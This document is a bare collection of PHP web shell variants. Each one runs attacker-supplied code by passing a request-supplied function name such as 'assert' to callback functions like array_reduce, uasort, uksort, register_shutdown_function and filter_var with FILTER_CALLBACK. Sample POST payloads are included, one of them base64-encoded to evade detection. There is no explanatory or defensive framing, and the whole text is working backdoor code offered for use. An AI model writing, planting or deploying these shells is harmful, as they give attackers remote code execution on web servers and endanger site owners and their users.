<?php
    $e = $_REQUEST['e'];
    $arr = array(1);
    array_reduce($arr, $e, $_POST['x']);
?>

post: e=assert&x=phpinfo();

<?php
    $e = $_REQUEST['e'];
    $arr = array($_POST['x']);
    $arr2 = array(1);
    array_udiff($arr, $arr2, $e);
?>

post: e=assert&x=phpinfo();

<?php
    $e = $_REQUEST['e'];
    $arr = array('test', $_REQUEST['x']);
    uasort($arr, base64_decode($e));
?>

post: e=YXNzZXJ0&x=phpinfo();

<?php
   $arr = new ArrayObject(array('test', $_REQUEST['x']));
   $arr->uasort('assert');
?>

<?php
    $e = $_REQUEST['e'];
    $arr = array('test' => 1, $_REQUEST['x'] => 2);
    uksort($arr, $e);
?>

post: e=assert&x=phpinfo();

<?php
   $arr = new ArrayObject(array('test' => 1, $_REQUEST['x'] => 2));
   $arr->uksort('assert');
?>

<?php
    $e = $_REQUEST['e'];
    register_shutdown_function($e, $_REQUEST['x']);
?>

<?php
    $e = $_REQUEST['e'];
    declare(ticks=1);
    register_tick_function ($e, $_REQUEST['x']);
?>

<?php
    filter_var($_REQUEST['x'], FILTER_CALLBACK, array('options' => 'assert'));
?>

<?php
    filter_var_array(array('test' => $_REQUEST['x']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
?>

